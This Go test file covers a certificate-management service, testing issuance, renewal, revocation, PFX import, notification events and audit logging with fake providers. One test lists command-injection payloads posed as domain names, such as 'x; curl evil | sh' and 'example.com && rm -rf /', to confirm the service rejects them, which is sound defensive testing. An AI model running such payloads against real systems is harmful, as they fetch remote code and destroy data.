package application

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"math/big"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/iamartinlong/Argus/internal/domain"
	"github.com/iamartinlong/Argus/internal/infrastructure/deploy"
	"github.com/iamartinlong/Argus/internal/infrastructure/providers"
)

// fakeProvider 模拟签发渠道
type fakeProvider struct {
	name       string
	mu         sync.Mutex
	issueErr   error
	renewErr   error
	revokeErr  error
	issued     *providers.IssuedCertificate
	issueCalls int
	lastDNS    map[string]string
}

func newFakeProvider(name string) *fakeProvider {
	return &fakeProvider{
		name: name,
		issued: &providers.IssuedCertificate{
			CertificatePEM: "-----BEGIN CERTIFICATE-----\nMIIBfake\n-----END CERTIFICATE-----",
			PrivateKeyPEM:  "-----BEGIN EC PRIVATE KEY-----\nMHQfake\n-----END EC PRIVATE KEY-----",
			IssuerCA:       "fake-ca",
			NotBefore:      time.Now().Add(-time.Hour),
			NotAfter:       time.Now().Add(90 * 24 * time.Hour),
		},
	}
}

func (f *fakeProvider) Name() string { return f.name }

func (f *fakeProvider) Issue(_ context.Context, req providers.IssueRequest) (*providers.IssuedCertificate, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.issueCalls++
	f.lastDNS = req.DNSConfig
	if f.issueErr != nil {
		return nil, f.issueErr
	}
	if req.CSRPEM != "" {
		// 模拟 CSR 模式：不返回私钥
		csr := *f.issued
		csr.PrivateKeyPEM = ""
		return &csr, nil
	}
	return f.issued, nil
}

func (f *fakeProvider) Renew(_ context.Context, req providers.RenewRequest) (*providers.IssuedCertificate, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.lastDNS = req.DNSConfig
	if f.renewErr != nil {
		return nil, f.renewErr
	}
	return f.issued, nil
}

func (f *fakeProvider) Revoke(context.Context, providers.RevokeRequest) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.revokeErr
}

func (f *fakeProvider) TestConnection(context.Context, *domain.ProviderAccount) error { return nil }

func (f *fakeProvider) ValidateDomain(context.Context, providers.ValidateRequest) error { return nil }

type fakeRegistry struct {
	providers map[string]providers.CertificateProvider
}

func newFakeRegistry(ps ...providers.CertificateProvider) *fakeRegistry {
	r := &fakeRegistry{providers: map[string]providers.CertificateProvider{}}
	for _, p := range ps {
		r.providers[p.Name()] = p
	}
	return r
}

func (r *fakeRegistry) Get(name string) (providers.CertificateProvider, error) {
	if p, ok := r.providers[name]; ok {
		return p, nil
	}
	return nil, errors.New("未注册的证书渠道: " + name)
}

func (r *fakeRegistry) Names() []string {
	names := make([]string, 0, len(r.providers))
	for n := range r.providers {
		names = append(names, n)
	}
	return names
}

// fakeCryptor 可逆的测试加密器（base64）
type fakeCryptor struct{}

func (fakeCryptor) EncryptString(s string) (string, error) {
	return base64.StdEncoding.EncodeToString([]byte(s)), nil
}

func (fakeCryptor) DecryptString(enc string) (string, error) {
	b, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

// fakeCertificateStore 内存实现
type fakeCertificateStore struct {
	mu    sync.Mutex
	certs map[string]*domain.Certificate
	order []string
}

func newFakeCertificateStore() *fakeCertificateStore {
	return &fakeCertificateStore{certs: map[string]*domain.Certificate{}}
}

func (f *fakeCertificateStore) Create(_ context.Context, c *domain.Certificate) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.certs[c.ID] = c
	f.order = append(f.order, c.ID)
	return nil
}

func (f *fakeCertificateStore) GetByID(_ context.Context, id string) (*domain.Certificate, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if c, ok := f.certs[id]; ok {
		return c, nil
	}
	return nil, domain.ErrNotFound
}

func (f *fakeCertificateStore) List(context.Context) ([]*domain.Certificate, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := make([]*domain.Certificate, 0, len(f.order))
	for _, id := range f.order {
		out = append(out, f.certs[id])
	}
	return out, nil
}

func (f *fakeCertificateStore) Update(_ context.Context, c *domain.Certificate) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	if _, ok := f.certs[c.ID]; !ok {
		return domain.ErrNotFound
	}
	f.certs[c.ID] = c
	return nil
}

func (f *fakeCertificateStore) UpdateStatus(_ context.Context, id string, status domain.CertificateStatus) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	c, ok := f.certs[id]
	if !ok {
		return domain.ErrNotFound
	}
	c.Status = status
	return nil
}

func (f *fakeCertificateStore) Delete(_ context.Context, id string) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	if _, ok := f.certs[id]; !ok {
		return domain.ErrNotFound
	}
	delete(f.certs, id)
	for i, x := range f.order {
		if x == id {
			f.order = append(f.order[:i], f.order[i+1:]...)
			break
		}
	}
	return nil
}

func (f *fakeCertificateStore) Count(context.Context) (int64, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return int64(len(f.certs)), nil
}

func (f *fakeCertificateStore) CountExpiring(context.Context, time.Duration) (int64, error) {
	return 0, nil
}

func (f *fakeCertificateStore) CountExpired(context.Context) (int64, error) { return 0, nil }

func (f *fakeCertificateStore) CountByAccount(_ context.Context, accountID string) (int64, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	var n int64
	for _, c := range f.certs {
		if c.AccountID == accountID {
			n++
		}
	}
	return n, nil
}

// fakeOrderStore 内存实现
type fakeOrderStore struct {
	mu     sync.Mutex
	orders map[string]*domain.Order
}

func newFakeOrderStore() *fakeOrderStore {
	return &fakeOrderStore{orders: map[string]*domain.Order{}}
}

func (f *fakeOrderStore) Create(_ context.Context, o *domain.Order) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.orders[o.ID] = o
	return nil
}

func (f *fakeOrderStore) GetByID(_ context.Context, id string) (*domain.Order, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if o, ok := f.orders[id]; ok {
		return o, nil
	}
	return nil, domain.ErrNotFound
}

func (f *fakeOrderStore) ListByCertificate(_ context.Context, certID string) ([]*domain.Order, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	var out []*domain.Order
	for _, o := range f.orders {
		if o.CertificateID == certID {
			out = append(out, o)
		}
	}
	return out, nil
}

func (f *fakeOrderStore) Update(_ context.Context, o *domain.Order) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.orders[o.ID] = o
	return nil
}

func (f *fakeOrderStore) RenewStats(context.Context, time.Time) (int64, int64, error) {
	return 0, 0, nil
}

func (f *fakeOrderStore) RenewalTrend(context.Context, time.Time) ([]*domain.RenewalTrendPoint, error) {
	return nil, nil
}

func newTestCertService(p providers.CertificateProvider) (*CertificateService, *fakeCertificateStore, *fakeOrderStore, *fakeProviderAccountStore) {
	provider := p
	if provider == nil {
		provider = newFakeProvider("acme")
	}
	certs := newFakeCertificateStore()
	orders := newFakeOrderStore()
	accounts := newFakeProviderAccountStore()
	audit := &fakeAuditStore{}
	svc := NewCertificateService(certs, orders, accounts, nil, audit, newFakeRegistry(provider), fakeCryptor{}, fixedClock{time.Now()}, 80, NewEventBus())
	return svc, certs, orders, accounts
}

func seedAccount(t *testing.T, accounts *fakeProviderAccountStore, provider string) *domain.ProviderAccount {
	t.Helper()
	a := &domain.ProviderAccount{
		ID:        "acc-1",
		Provider:  provider,
		Name:      provider,
		Status:    "active",
		CreatedAt: time.Now(),
	}
	if err := accounts.Create(context.Background(), a); err != nil {
		t.Fatal(err)
	}
	return a
}

func TestIssueCSRMode(t *testing.T) {
	svc, certs, _, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")

	// 非 ACME 渠道拒绝 CSR 模式
	svc2, _, _, accounts2 := newTestCertService(newFakeProvider("aliyun"))
	seedAccount(t, accounts2, "aliyun")
	_, err := svc2.Issue(context.Background(), IssueInput{
		AccountID: "acc-1", Verification: domain.VerifyHTTP01,
		CSRPEM: "-----BEGIN CERTIFICATE REQUEST-----\nAA==\n-----END CERTIFICATE REQUEST-----",
	})
	if err == nil {
		t.Fatal("expected CSR mode rejected for non-acme provider")
	}

	// ACME 渠道：CSR 模式通过（fake provider 成功签发），私钥不落盘
	csrPEM := "-----BEGIN CERTIFICATE REQUEST-----\nAA==\n-----END CERTIFICATE REQUEST-----"
	cert, err := svc.Issue(context.Background(), IssueInput{
		AccountID: "acc-1", Verification: domain.VerifyHTTP01, CSRPEM: csrPEM,
	})
	if err != nil {
		t.Fatalf("csr issue: %v", err)
	}
	got, _ := certs.GetByID(context.Background(), cert.ID)
	if got.PrivateKeyEnc != "" {
		t.Fatal("CSR 模式不应存储私钥")
	}
	if got.CertificatePEM == "" {
		t.Fatal("证书内容缺失")
	}

	// CSR 证书不可自动续期（返回 sentinel 错误，调度器据此静默跳过）
	_, err = svc.Renew(context.Background(), cert.ID, nil, "")
	if !errors.Is(err, ErrCSRCertNotRenewable) {
		t.Fatalf("expected ErrCSRCertNotRenewable, got %v", err)
	}
}

func TestImportRejectsMaliciousDomain(t *testing.T) {
	svc, _, _, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")
	ctx := context.Background()

	certPEM, keyPEM := generateTestCertWithKey("safe.example.com")

	// 注入载荷域名拒绝（防部署 hook 命令注入）
	for _, bad := range []string{
		"x; curl evil | sh",
		"$(id)",
		"`id`",
		"example.com && rm -rf /",
		"x' OR '1'='1",
	} {
		_, err := svc.Import(ctx, []string{bad}, certPEM, keyPEM, domain.VerifyDNS01, nil)
		if err == nil {
			t.Fatalf("malicious domain accepted: %q", bad)
		}
	}
	// 正常域名通过（含通配符、多级）
	for _, good := range []string{"example.com", "www.example.com", "*.example.com", "a-b.example.co.uk"} {
		if _, err := svc.Import(ctx, []string{good}, certPEM, keyPEM, domain.VerifyDNS01, nil); err != nil {
			t.Fatalf("valid domain rejected: %q: %v", good, err)
		}
	}
}

func TestIssueSuccess(t *testing.T) {
	svc, certs, orders, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")

	cert, err := svc.Issue(context.Background(), IssueInput{
		Domains:      []string{"example.com", "www.example.com"},
		AccountID:    "acc-1",
		Verification: domain.VerifyHTTP01,
		NotifyEvents: []domain.NotificationEvent{domain.EventIssueSuccess, domain.EventDeploySuccess},
	})
	if err != nil {
		t.Fatalf("issue: %v", err)
	}
	if cert.Status != domain.StatusValid {
		t.Fatalf("expected valid, got %s", cert.Status)
	}
	if cert.PrivateKeyEnc == "" || cert.CertificatePEM == "" {
		t.Fatal("certificate or private key missing")
	}
	if len(cert.NotifyEvents) != 2 || cert.NotifyEvents[0] != domain.EventIssueSuccess {
		t.Fatalf("notify events not carried: %+v", cert.NotifyEvents)
	}
	if _, err := certs.GetByID(context.Background(), cert.ID); err != nil {
		t.Fatalf("cert not persisted: %v", err)
	}
	ordersList, err := orders.ListByCertificate(context.Background(), cert.ID)
	if err != nil || len(ordersList) != 1 {
		t.Fatalf("expected 1 order, got %v (%v)", ordersList, err)
	}
	if ordersList[0].Status != domain.OrderSuccess {
		t.Fatalf("expected success order, got %s", ordersList[0].Status)
	}
}

func TestIssueValidation(t *testing.T) {
	svc, _, _, _ := newTestCertService(nil)

	// 无域名
	if _, err := svc.Issue(context.Background(), IssueInput{
		AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	}); !errors.Is(err, domain.ErrInvalidArgument) {
		t.Fatalf("expected invalid argument, got %v", err)
	}
	// 非法验证方式
	if _, err := svc.Issue(context.Background(), IssueInput{
		Domains: []string{"example.com"}, AccountID: "acc-1", Verification: "bad",
	}); !errors.Is(err, domain.ErrInvalidArgument) {
		t.Fatalf("expected invalid argument, got %v", err)
	}
}

func TestIssueProviderFailure(t *testing.T) {
	fp := newFakeProvider("acme")
	fp.issueErr = errors.New("authorization failed")
	svc, certs, _, accounts := newTestCertService(fp)
	seedAccount(t, accounts, "acme")

	cert, err := svc.Issue(context.Background(), IssueInput{
		Domains: []string{"example.com"}, AccountID: "acc-1", Verification: domain.VerifyDNS01,
	})
	if err == nil {
		t.Fatal("expected error")
	}
	stored, _ := certs.GetByID(context.Background(), cert.ID)
	if stored == nil || stored.Status != domain.StatusFailed {
		t.Fatalf("expected failed status, got %v", stored)
	}
	if stored.LastError == "" {
		t.Fatal("expected last_error recorded")
	}
}

// TestIssueInvalidNotifyEvents 无效通知事件应被拒绝
func TestIssueInvalidNotifyEvents(t *testing.T) {
	svc, _, _, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")
	_, err := svc.Issue(context.Background(), IssueInput{
		Domains:      []string{"example.com"},
		AccountID:    "acc-1",
		Verification: domain.VerifyHTTP01,
		NotifyEvents: []domain.NotificationEvent{"bogus"},
	})
	if err == nil {
		t.Fatal("expected invalid notify event rejected")
	}
}

// TestImportCarriesNotifyEvents 导入携带通知事件勾选
func TestImportCarriesNotifyEvents(t *testing.T) {
	svc, certs, _, _ := newTestCertService(nil)
	cert, err := svc.Import(context.Background(),
		[]string{"import-events.example.com"}, testCertPEM, "-----BEGIN EC PRIVATE KEY-----\nMHQfake\n-----END EC PRIVATE KEY-----",
		domain.VerifyDNS01, []domain.NotificationEvent{domain.EventDeploySuccess, domain.EventCertExpiring})
	if err != nil {
		t.Fatalf("import: %v", err)
	}
	if len(cert.NotifyEvents) != 2 {
		t.Fatalf("notify events not carried: %+v", cert.NotifyEvents)
	}
	got, _ := certs.GetByID(context.Background(), cert.ID)
	if len(got.NotifyEvents) != 2 || got.NotifyEvents[0] != domain.EventDeploySuccess {
		t.Fatalf("notify events not persisted: %+v", got.NotifyEvents)
	}
	// 无效事件拒绝
	if _, err := svc.Import(context.Background(),
		[]string{"x.example.com"}, testCertPEM, "-----BEGIN EC PRIVATE KEY-----\nMHQfake\n-----END EC PRIVATE KEY-----",
		domain.VerifyDNS01, []domain.NotificationEvent{"bogus"}); err == nil {
		t.Fatal("expected invalid notify event rejected")
	}
}

// TestIssueFailurePublishesIssueFailed 签发失败发布独立 issue.failed 事件
func TestIssueFailurePublishesIssueFailed(t *testing.T) {
	fp := newFakeProvider("acme")
	fp.issueErr = errors.New("boom")
	bus := NewEventBus()
	certs := newFakeCertificateStore()
	orders := newFakeOrderStore()
	accounts := newFakeProviderAccountStore()
	svc := NewCertificateService(certs, orders, accounts, nil, &fakeAuditStore{},
		newFakeRegistry(fp), fakeCryptor{}, fixedClock{time.Now()}, 80, bus)
	seedAccount(t, accounts, "acme")

	var gotIssueFail, gotRenewFail int
	bus.Subscribe(EventCertificateIssueFail, func(Event) { gotIssueFail++ })
	bus.Subscribe(EventCertificateRenewFail, func(Event) { gotRenewFail++ })

	_, err := svc.Issue(context.Background(), IssueInput{
		Domains: []string{"example.com"}, AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	})
	if err == nil {
		t.Fatal("expected error")
	}
	if gotIssueFail != 1 {
		t.Fatalf("expected issue.failed published, got %d", gotIssueFail)
	}
	if gotRenewFail != 0 {
		t.Fatalf("issue failure should not publish renew.failed, got %d", gotRenewFail)
	}
}

// TestUpdateNotifyEvents 更新证书通知事件订阅
func TestUpdateNotifyEvents(t *testing.T) {
	svc, _, _, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")
	cert, err := svc.Issue(context.Background(), IssueInput{
		Domains: []string{"example.com"}, AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	})
	if err != nil {
		t.Fatal(err)
	}
	updated, err := svc.UpdateNotifyEvents(context.Background(), cert.ID,
		[]domain.NotificationEvent{domain.EventIssueSuccess, domain.EventDeployFailed})
	if err != nil {
		t.Fatalf("update notify events: %v", err)
	}
	if len(updated.NotifyEvents) != 2 || updated.NotifyEvents[1] != domain.EventDeployFailed {
		t.Fatalf("unexpected updated events: %+v", updated.NotifyEvents)
	}
	// 重复事件去重
	updated, err = svc.UpdateNotifyEvents(context.Background(), cert.ID,
		[]domain.NotificationEvent{domain.EventIssueSuccess, domain.EventIssueSuccess})
	if err != nil {
		t.Fatalf("update notify events: %v", err)
	}
	if len(updated.NotifyEvents) != 1 {
		t.Fatalf("expected dedupe, got %+v", updated.NotifyEvents)
	}
	// 无效事件拒绝
	if _, err := svc.UpdateNotifyEvents(context.Background(), cert.ID, []domain.NotificationEvent{"bogus"}); err == nil {
		t.Fatal("expected invalid notify event rejected")
	}
}

func TestRenew(t *testing.T) {
	svc, _, _, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")

	cert, err := svc.Issue(context.Background(), IssueInput{
		Domains: []string{"example.com"}, AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	})
	if err != nil {
		t.Fatal(err)
	}
	renewed, err := svc.Renew(context.Background(), cert.ID, nil, "")
	if err != nil {
		t.Fatalf("renew: %v", err)
	}
	if renewed.Status != domain.StatusValid {
		t.Fatalf("expected valid after renew, got %s", renewed.Status)
	}
}

func TestRenewRevokedCertificate(t *testing.T) {
	svc, _, _, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")
	cert, err := svc.Issue(context.Background(), IssueInput{
		Domains: []string{"example.com"}, AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	})
	if err != nil {
		t.Fatal(err)
	}
	cert.Status = domain.StatusRevoked
	if err := svc.certs.Update(context.Background(), cert); err != nil {
		t.Fatal(err)
	}
	if _, err := svc.Renew(context.Background(), cert.ID, nil, ""); !errors.Is(err, domain.ErrInvalidArgument) {
		t.Fatalf("expected invalid argument for revoked cert, got %v", err)
	}
}

func TestRevoke(t *testing.T) {
	svc, _, _, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")
	cert, err := svc.Issue(context.Background(), IssueInput{
		Domains: []string{"example.com"}, AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := svc.Revoke(context.Background(), cert.ID); err != nil {
		t.Fatalf("revoke: %v", err)
	}
	got, _ := svc.certs.GetByID(context.Background(), cert.ID)
	if got.Status != domain.StatusRevoked {
		t.Fatalf("expected revoked, got %s", got.Status)
	}
}

// TestRevokeImportedCert 导入的证书（无账户）吊销应返回清晰错误而非 not found
func TestRevokeImportedCert(t *testing.T) {
	svc, _, _, _ := newTestCertService(nil)
	cert, err := svc.Import(context.Background(),
		[]string{"import-revoke.example.com"}, testCertPEM, "-----BEGIN EC PRIVATE KEY-----\nMHQfake\n-----END EC PRIVATE KEY-----",
		domain.VerifyDNS01, nil)
	if err != nil {
		t.Fatalf("import: %v", err)
	}
	err = svc.Revoke(context.Background(), cert.ID)
	if !errors.Is(err, domain.ErrInvalidArgument) {
		t.Fatalf("expected ErrInvalidArgument for imported cert revoke, got %v", err)
	}
	if errors.Is(err, domain.ErrNotFound) {
		t.Fatalf("imported cert revoke should not be not found: %v", err)
	}
	if !strings.Contains(err.Error(), "导入的证书无法吊销") {
		t.Fatalf("expected clear message, got %v", err)
	}
}

func TestImport(t *testing.T) {
	svc, _, _, _ := newTestCertService(nil)
	certPEM := testCertPEM
	cert, err := svc.Import(context.Background(),
		[]string{"import.example.com"}, certPEM, "-----BEGIN EC PRIVATE KEY-----\nMHQfake\n-----END EC PRIVATE KEY-----",
		domain.VerifyDNS01, nil)
	if err != nil {
		t.Fatalf("import: %v", err)
	}
	if cert.Provider != "import" || cert.Status != domain.StatusValid {
		t.Fatalf("unexpected cert: %+v", cert)
	}
	if cert.NotAfter.IsZero() {
		t.Fatal("expected validity parsed")
	}
	if _, err := svc.Import(context.Background(), nil, "", "", domain.VerifyDNS01, nil); !errors.Is(err, domain.ErrInvalidArgument) {
		t.Fatalf("expected invalid argument, got %v", err)
	}
}

func TestDelete(t *testing.T) {
	svc, certs, _, accounts := newTestCertService(nil)
	seedAccount(t, accounts, "acme")
	cert, err := svc.Issue(context.Background(), IssueInput{
		Domains: []string{"example.com"}, AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := svc.Delete(context.Background(), cert.ID); err != nil {
		t.Fatal(err)
	}
	if _, err := certs.GetByID(context.Background(), cert.ID); !errors.Is(err, domain.ErrNotFound) {
		t.Fatalf("expected not found after delete, got %v", err)
	}
}

func TestStatusTransitions(t *testing.T) {
	c := &domain.Certificate{NotAfter: time.Now().Add(100 * 24 * time.Hour)}
	c.UpdateStatus(time.Now())
	if c.Status != domain.StatusValid {
		t.Fatalf("expected valid, got %s", c.Status)
	}
	c.NotAfter = time.Now().Add(10 * 24 * time.Hour)
	c.UpdateStatus(time.Now())
	if c.Status != domain.StatusExpiring {
		t.Fatalf("expected expiring, got %s", c.Status)
	}
	c.NotAfter = time.Now().Add(-1 * time.Hour)
	c.UpdateStatus(time.Now())
	if c.Status != domain.StatusExpired {
		t.Fatalf("expected expired, got %s", c.Status)
	}
}

func TestDNSConfigPersistedAndReusedOnRenew(t *testing.T) {
	fp := newFakeProvider("acme")
	svc, _, _, accounts := newTestCertService(fp)
	seedAccount(t, accounts, "acme")

	dnsCfg := map[string]string{
		"provider": "alidns", "ALICLOUD_ACCESS_KEY": "ak-test", "ALICLOUD_SECRET_KEY": "sk-test",
	}
	cert, err := svc.Issue(context.Background(), IssueInput{
		Domains:      []string{"dns.example.com"},
		AccountID:    "acc-1",
		Verification: domain.VerifyDNS01,
		DNSConfig:    dnsCfg,
	})
	if err != nil {
		t.Fatalf("issue: %v", err)
	}
	if cert.DNSConfigEnc == "" {
		t.Fatal("expected dns_config_enc persisted")
	}
	// 续期时不传配置，应复用存储的配置
	renewed, err := svc.Renew(context.Background(), cert.ID, nil, "")
	if err != nil {
		t.Fatalf("renew: %v", err)
	}
	_ = renewed
	fp.mu.Lock()
	defer fp.mu.Unlock()
	if fp.lastDNS["provider"] != "alidns" || fp.lastDNS["ALICLOUD_ACCESS_KEY"] != "ak-test" {
		t.Fatalf("renew should reuse stored DNS config, got %v", fp.lastDNS)
	}
}

func TestAccountDeleteRejectsInUse(t *testing.T) {
	certs := newFakeCertificateStore()
	accounts := newFakeProviderAccountStore()
	seedAccount(t, accounts, "acme")
	audit := &fakeAuditStore{}
	svc := NewCertificateService(certs, newFakeOrderStore(), accounts, nil, audit, newFakeRegistry(newFakeProvider("acme")), fakeCryptor{}, fixedClock{time.Now()}, 80, NewEventBus())
	ctx := context.Background()

	cert, err := svc.Issue(ctx, IssueInput{
		Domains: []string{"ref.example.com"}, AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	})
	if err != nil {
		t.Fatal(err)
	}
	_ = cert

	accountSvc := NewProviderAccountService(accounts, certs, audit, newFakeRegistry(newFakeProvider("acme")), fakeCryptor{}, fixedClock{time.Now()})
	if err := accountSvc.Delete(ctx, "acc-1"); !errors.Is(err, domain.ErrConflict) {
		t.Fatalf("expected ErrConflict for in-use account, got %v", err)
	}

	// 删除证书后可删除账户
	if err := svc.Delete(ctx, cert.ID); err != nil {
		t.Fatal(err)
	}
	if err := accountSvc.Delete(ctx, "acc-1"); err != nil {
		t.Fatalf("expected delete ok after cert removed, got %v", err)
	}
}

// TestUpdateTargetsWritesAudit 更新证书部署目标绑定应记录审计日志
func TestUpdateTargetsWritesAudit(t *testing.T) {
	certs := newFakeCertificateStore()
	accounts := newFakeProviderAccountStore()
	seedAccount(t, accounts, "acme")
	audit := &fakeAuditStore{}
	svc := NewCertificateService(certs, newFakeOrderStore(), accounts, nil, audit, newFakeRegistry(newFakeProvider("acme")), fakeCryptor{}, fixedClock{time.Now()}, 80, NewEventBus())
	ctx := context.Background()

	cert, err := svc.Issue(ctx, IssueInput{
		Domains: []string{"audit-targets.example.com"}, AccountID: "acc-1", Verification: domain.VerifyHTTP01,
	})
	if err != nil {
		t.Fatal(err)
	}

	if err := svc.UpdateTargets(ctx, cert.ID, []string{"t1", "t2"}); err != nil {
		t.Fatal(err)
	}

	// 确认持久化
	got, _ := certs.GetByID(ctx, cert.ID)
	if len(got.DeployTargetIDs) != 2 {
		t.Fatalf("expected 2 targets, got %+v", got.DeployTargetIDs)
	}

	// 确认审计
	found := false
	for _, l := range audit.logs {
		if l.Action == domain.AuditCertTargets && l.Resource == "audit-targets.example.com" && l.Detail == "targets=t1,t2" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("expected certificate.targets.update audit entry, got %+v", audit.logs)
	}
}

// TestRenewImportedCert 导入的证书（无账户）续期应返回清晰错误而非 not found
func TestRenewImportedCert(t *testing.T) {
	svc, _, _, _ := newTestCertService(nil)
	cert, err := svc.Import(context.Background(),
		[]string{"import-renew.example.com"}, testCertPEM, "-----BEGIN EC PRIVATE KEY-----\nMHQfake\n-----END EC PRIVATE KEY-----",
		domain.VerifyDNS01, nil)
	if err != nil {
		t.Fatalf("import: %v", err)
	}
	_, err = svc.Renew(context.Background(), cert.ID, nil, "")
	if !errors.Is(err, domain.ErrInvalidArgument) {
		t.Fatalf("expected ErrInvalidArgument for imported cert renew, got %v", err)
	}
	if errors.Is(err, domain.ErrNotFound) {
		t.Fatalf("imported cert renew should not be not found: %v", err)
	}
	if !strings.Contains(err.Error(), "导入的证书无法续期") {
		t.Fatalf("expected clear message, got %v", err)
	}
}

// generateSANCert 生成含多个 SAN 的自签证书 + 私钥 PEM
func generateSANCert(sans []string) (string, string) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		panic(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{CommonName: sans[0]},
		DNSNames:     sans,
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		panic(err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})),
		string(pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER}))
}

// TestImportPFX 从 PFX 导入证书：多域名从 SAN 自动提取、provider=import
func TestImportPFX(t *testing.T) {
	svc, certs, _, _ := newTestCertService(nil)
	certPEM, keyPEM := generateSANCert([]string{"pfx-a.example.com", "pfx-b.example.com"})
	pfxData, err := deploy.BuildPFX(certPEM, keyPEM, "secret123")
	if err != nil {
		t.Fatalf("build pfx: %v", err)
	}
	ctx := context.Background()
	cert, err := svc.ImportPFX(ctx, pfxData, "secret123", domain.VerifyDNS01, nil)
	if err != nil {
		t.Fatalf("import pfx: %v", err)
	}
	if cert.Provider != "import" {
		t.Fatalf("expected provider import, got %s", cert.Provider)
	}
	// 多域名从 SAN 提取
	if len(cert.Domains) != 2 || cert.Domains[0] != "pfx-a.example.com" || cert.Domains[1] != "pfx-b.example.com" {
		t.Fatalf("unexpected domains: %+v", cert.Domains)
	}
	// 证书与私钥均已入库
	got, _ := certs.GetByID(ctx, cert.ID)
	if got.CertificatePEM == "" || got.PrivateKeyEnc == "" {
		t.Fatalf("cert/key not persisted: %+v", got)
	}
	// 错误密码应返回清晰错误
	if _, err := svc.ImportPFX(ctx, pfxData, "wrong", domain.VerifyDNS01, nil); !errors.Is(err, domain.ErrInvalidArgument) {
		t.Fatalf("expected invalid argument for wrong password, got %v", err)
	}
}

// TestImportPFXMismatchedKey 私钥与证书不匹配的 PFX 应被拒绝
func TestImportPFXMismatchedKey(t *testing.T) {
	svc, _, _, _ := newTestCertService(nil)
	certA, _ := generateSANCert([]string{"pfx-mismatch.example.com"})
	_, keyB := generateSANCert([]string{"pfx-mismatch.example.com"})
	// 用证书 A + 私钥 B 合成不匹配的 PFX
	pfxData, err := deploy.BuildPFX(certA, keyB, "secret123")
	if err != nil {
		t.Fatalf("build pfx: %v", err)
	}
	_, err = svc.ImportPFX(context.Background(), pfxData, "secret123", domain.VerifyDNS01, nil)
	if !errors.Is(err, domain.ErrInvalidArgument) {
		t.Fatalf("expected invalid argument for mismatched key, got %v", err)
	}
	if !strings.Contains(err.Error(), "不匹配") {
		t.Fatalf("expected mismatch message, got %v", err)
	}
}
